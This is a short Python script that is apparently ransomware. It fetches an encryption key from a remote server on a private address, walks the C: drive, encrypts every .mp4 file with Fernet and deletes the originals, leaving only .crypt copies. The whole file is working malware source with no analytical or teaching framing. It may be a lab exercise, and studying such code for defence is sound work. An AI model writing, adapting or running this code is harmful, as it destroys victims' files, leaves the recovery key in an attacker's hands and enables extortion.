import socket
import threading
import socket
import os
from cryptography.fernet import Fernet

host = '192.168.202.1'
port = 4567
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
try:
    client.connect((host, port))
    client.send(b'Start')
except:
    print('can\'t connect to server')
    exit()


secret_key = client.recv(2048)
client.close()


def encryptor(path):
    if not(path.endswith('.py')):
        with open(path, 'rb') as f:
            data = f.read()
        
        tool = Fernet(secret_key)
        try:
            encrypted_data = tool.encrypt(data)
            new_name = path + '.crypt'

            with open(new_name, 'wb') as f:
                f.write(encrypted_data)
                
            f.close()
            
            os.remove(path)
        except:
            print("Error: Not Permitted")
        else:
            print('Encryption sucessful')



def threader(path):
    th = threading.Thread(target=encryptor, args=(path,), daemon=True)
    th.start()


def dir_walker():
    extensions = ['.mp4']
    for root, dirs, files in os.walk("c:/"):
        for file in files:
            for ext in extensions:    
                if file.endswith(ext):
                    ally = os.path.join(root, file)
                    print(ally)
                    threader(ally)
    

    
dir_walker()
